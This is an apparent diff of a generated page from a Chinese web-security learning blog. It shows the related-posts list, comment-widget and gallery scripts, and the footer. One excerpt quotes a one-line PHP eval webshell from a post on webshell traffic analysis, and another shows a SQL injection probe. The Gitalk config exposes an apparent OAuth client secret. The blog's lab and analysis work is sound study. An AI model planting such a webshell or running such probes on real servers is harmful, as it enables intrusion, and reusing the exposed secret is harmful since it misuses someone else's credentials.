+						<div class="relate-post-cover">
+							<a href="/2023/05/04/PHP-Web%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP-Web渗透中常见的高危函数以及伪协议">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/PHP.png" alt="PHP-Web渗透中常见的高危函数以及伪协议"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/05/01/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="Webshell流量分析">
+								Webshell流量分析			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 1日, 2023				
+							</p>
+							<p class="relate-post-content">
+								菜刀一句话在这里：&lt;?php eval($_POST[&#39;myhack&#39;]) ?&gt;
+用的某个工具包里的菜刀，流量如下：
+
+agent有火狐5.0以及百度
+连接密码开头，用了array_map封装命令执行函数，...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/05/01/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="Webshell流量分析">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/oiiai.jpg" alt="Webshell流量分析"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/03/30/sqli-labs-Stacked-Injections/" title="sqli-labs Stacked Injections">
+								sqli-labs Stacked Injections			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 30日, 2023				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] sqli-labs Stacked Injections前言针对sqli-labs靶场的做题笔记
+环境虚拟机环境攻击机：kali | 10.10.10.1靶机：Debian 11.1 | 10.10.10.3 | Apa...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/03/30/sqli-labs-Stacked-Injections/" title="sqli-labs Stacked Injections">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/rickroll.jpg" alt="sqli-labs Stacked Injections"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/10/25/Web%E9%9D%B6%E5%9C%BA-DSVW/" title="Web靶场-DSVW">
+								Web靶场-DSVW			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十月 25日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] DSVW靶场练习笔记前言是针对DSVW靶场的练习笔记是在搞完Pikachu靶场之后在整理vulnstack的Web安全入门进阶靶场时发现的里面版本比较老，就单独搞出来玩玩
+最新版本v0.2b用Python 3运行代码很顶...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/10/25/Web%E9%9D%B6%E5%9C%BA-DSVW/" title="Web靶场-DSVW">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-DSVW"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/" title="Web靶场-Pikachu">
+								Web靶场-Pikachu			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十月 6日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] Pikachu靶场练习笔记前言是针对Pikachu靶场的练习笔记是在搞完WebGoat之后想着再找一个靶场玩玩
+环境攻击者：Kali Linux | 10.10.10.1靶机：Ubuntu | 10.10.10.2 | ...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/" title="Web靶场-Pikachu">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-Pikachu"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/05/10/%E4%B8%80%E4%BA%9BBurpSuite%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/" title="一些BurpSuite进阶使用">
+								一些BurpSuite进阶使用			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 10日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] Burp Suite进阶前言目前只是些平时练习过程中接触到的BP进阶使用方法和技巧
+后续再考虑找些专门的教程学学
+使用宏抓取页面token下面以抓取pikachu靶场爆破模块的token为例
+来自于g0tmi1k的文章
+...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/05/10/%E4%B8%80%E4%BA%9BBurpSuite%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/" title="一些BurpSuite进阶使用">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/burpsuite.png" alt="一些BurpSuite进阶使用"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/01/16/Web%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86-XSS/" title="Web漏洞整理-XSS">
+								Web漏洞整理-XSS			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								一月 16日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] XSS前言主要是之前练习了很多靶场所设计到的XSS的笔记都比较分散这里就系统地整理下，主要是整合到一起，方便以后查阅
+整理自靶场练习Webgoat、pikachu、Web For Pentester、XVWA以及一个很有...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/01/16/Web%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86-XSS/" title="Web漏洞整理-XSS">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/WebVuln2.jpg" alt="Web漏洞整理-XSS"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/01/13/SQL%E4%B8%8Esqlmap/" title="SQL与sqlmap">
+								SQL与sqlmap			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								一月 13日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] SQL与sqlmapSQL语法order by
+
+对查询结果排序
+ASC：升序（默认）、DESC：降序
+SQL注入中多在成功查询之后添加order by i来猜解回显的字段数
+如XXX/?id=1&#39; order ...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/01/13/SQL%E4%B8%8Esqlmap/" title="SQL与sqlmap">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/rickroll.jpg" alt="SQL与sqlmap"/>
+							</a>
+						</div>
+					</li>												
+			
+		</ul>
+	
+</div>	
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-comment">
+
+	
+
+		
+
+			<!-- gitalk comment -->
+			<!-- show gitalk comment -->
+<div id="gitalk-container"></div>
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+
+	(function gitalkComment(){
+		//Thanks O-R
+		//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+		//去除尾部匹配正则数组的字符串  
+		//Remove redundant characters
+		String.prototype.trimEnd = function(regStr) {
+			let result = this;
+			if(regStr == undefined || regStr == null || regStr == "") {
+				return result;
+			}
+			let array = regStr.split(',');
+
+			if(array.length > 0) {
+
+				let c = array.shift(), 
+					str = this,
+					i = str.length,
+					rg = new RegExp(c),
+					matchArr = str.match(rg);
+
+				if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+					let matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+						.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+						.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+						.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+						.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+						.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+						.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+						.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+					matchStr = matchStr + '$';
+					result = str.replace(new RegExp(matchStr), "");
+				}
+
+				if(array.length > 0) {
+					return result.trimEnd(array.join())
+				} else {
+					return result;
+				}
+			}
+		};
+
+		//Create gitalk
+		let gitalk = new Gitalk({
+			clientID: 'Ov23liAb4iwJ1VAXeknf',
+			clientSecret: 'dbb92e8b0d3419b2a395abc8331a12e38e330e6c',
+			//id: window.location.pathname,
+			//id: decodeURI(window.location.pathname),
+			//id: (window.location.pathname).split("/").pop().substring(0, 49),
+			id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
+			repo: 'Blog-Gitalk',
+			owner: 'ArcheriShade',
+			admin: 'ArcheriShade',
+			distractionFreeMode: 'true',
+		})
+		gitalk.render('gitalk-container');		
+	})();
+</script>
+
+		
+		
+	
+
+</div>
+				</div>
+				<!-- <div class="investment-content-list">
+					<div class="layout-share">
+	
+	
+		<div class="config-info">
+			Please check the parameter of <b>comment</b> in config.yml of hexo-theme-Annie!
+		</div>	
+	
+</div>
+
+
+				</div> -->
+			</div>	
+		</div>
+	</div>
+</div>
+
+<!-- show math formula -->
+
+
+
+	 
+	
+<script src="/plugin/clipboard/clipboard.js"></script>
+
+	<script>
+		// Copy code !
+	    function preprocessing() {
+	        $("#article-content .highlight").each(function() {
+	            $(this).wrap('<div id="post-code"></div>');
+	        })
+
+	        $("#article-content #post-code").each(function() {
+	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
+	        })
+
+	        $("#article-content .copy-nav").each(function() {
+	            let languageClass = $(this).next().attr('class'),
+	                language = ((languageClass.length > 9) && (languageClass != null)) ? languageClass.substr(10) : "none"; //why 9? Need to check language?
+
+	            $(this).find('.code-language').text(language);
+	            $(this).append('<span class="copy-btn icon-paste"></span>');
+	        });
+	    }
+
+		function copy() {
+		    $('#article-content #post-code').each(function(i) {
+		        let codeCopyId = 'codeCopy-' + i;
+
+		        let codeNode = $(this).find('.code'),
+		            copyButton = $(this).find('.copy-btn');
+
+		        codeNode.attr('id', codeCopyId);
+		        copyButton.attr('data-clipboard-target-id', codeCopyId);
+		    })
+   
+			let clipboard = new ClipboardJS('.copy-btn', {
+					target: function(trigger) {
+						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+					}
+		      	});
+
+			//pure js
+			function showTooltip(elem, msg) {		   
+				elem.setAttribute('aria-label', msg);
+				elem.setAttribute('class', 'copy-btn icon-clipboard1');
+				setTimeout(function() {
+					elem.setAttribute('class', 'copy-btn icon-paste');
+				}, 2000);
+			}
+
+			clipboard.on('success', function(e) {
+			    e.clearSelection();
+			    console.info('Action:', e.action);		   
+			    console.info('Trigger:', e.trigger);
+			    showTooltip(e.trigger, 'Copied!');   
+			});
+			
+			clipboard.on('error', function(e) {
+			    console.error('Action:', e.action);
+			    console.error('Trigger:', e.trigger);
+			});
+		}
+		
+		(function copyCode(){
+			if ($('.layout-post').length) {
+			    preprocessing();
+			    copy();
+			} 
+		})();
+	</script>
+
+
+
+
+
+
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+
+<script src="/plugin/fancybox/jquery.fancybox.js"></script>
+
+
+<script type="text/javascript">
+	(function gallerySet(){
+		let titleID = $('.article-title a'),
+			imageID = $('.article-content img'),
+			videoID = $('.article-content video');
+		
+		let postTitle = titleID.text() ? titleID.text() : "No post title!";
+		
+		imageID.each(function() {
+			let imgPath = $(this).attr('src'),
+				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
+		});
+		
+		videoID.each(function() {
+			let videoPath = $(this).attr('src');
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
+		});
+		
+		//TODO：支持html5 video
+
+		if($('#layout-post').length) {
+			$('[data-fancybox="gallery"]').fancybox({
+				loop: true,
+				buttons: [
+					"zoom",
+					"share",
+					"slideShow",
+					"fullScreen",
+					//"download",
+					"thumbs",
+					"close"
+				],
+				protect: true
+			});
+		}
+	})();
+</script>
+		</main>
+
+		<!--footer-->
+		<footer>
+	<div id="navigation-show">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+		<li class="menu-search">
+			<a href="javascript:;" class="popup-trigger">搜索</a>
+		</li>
+	
+</ul>
+	</div>
+
+	<div class="copyright">
+		<p>
+			 
+				&copy;2024, content by ArcheriShade. All Rights Reserved.
+			
+			
+				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
+			
+		</p>
+		<p>
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+
+
+			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
+			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
+		</p>
+	</div>		
+</footer>
+		
+	<!-- Local or hitokoto! -->
+
+	
+<script src="/plugin/motto/motto.js"></script>
+
+	
+	<script type="text/javascript">
+		(function motto(){
+			let mottoText = getMingYanContent().split('</br> - </br>'),
+			
+			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
+			
+			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
+			
+			mottoTextContent = mottoTextContent.trim().substring(0, 100);
+		
+			$("#motto-content").html( mottoTextContent);
+			$("#motto-author").html( mottoTextFrom  );
+		})();	
+	</script>	
+
+
+
+<!-- love effect -->
+
+
+<!-- back to top -->
+
+	<div id="totop">
+	<span class="icon-circle-up"></span>
+</div>
+
+
+
+<!-- site analysis -->
+
+
+	<!-- site-analysis -->
+	
+	
+	
+	
+	
+ 
+
+<!-- leancloud -->
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+	
+
+  
+
+	<!--
+	时间：2018-10-3
+	描述：
+		插件名称：hexo-generator-search-zip
+		插件来源: https://github.com/SuperKieran/hexo-generator-search-zip
+		代码参考：https://github.com/SuperKieran/TKL/blob/master/layout/_partial/search.ejs(Include: js & css)	
+-->
+<div class="popup search-popup local-search-popup scrollbar" >
+	<div class="local-search-container">
+		<span class="popup-btn-close">
+      		ESC
+   		</span>
+		<div class="local-search-header">
+			<div class="input-prompt">				
+			</div>
+			<input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
+		</div>
+		<div class="local-search-body">
+			<div id="local-search-output"></div>
+		</div>
+		<div class="local-search-footer">
+			<div class="topN-post">				
+				
+								
+			</div>
+		</div>
+	</div>
+</div>
+
+
+<script src="/plugin/search/ziploader.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script type="text/javascript">
+	var search_path = 'search.json',
+		zip_Path = '/search.zip',
+		version_Path = '/searchVersion.txt',
+		input_Trigger = 'auto',
+		top_N = '2';
+
+	themeLocalSearch({
+		search_path, 
+		zip_Path, 
+		version_Path, 
+		input_Trigger, 
+		top_N
+	});
+</script>
+
+
+
+<script src="/plugin/chinese/chinese.js"></script>
+<script src="/plugin/imagelazyloader/yall.min.js"></script>
+<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
+<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
+<script src="/plugin/resizediv/resizediv.js"></script>
+<script src="/js/main.js"></script>
+
+	</body>	
+</html>
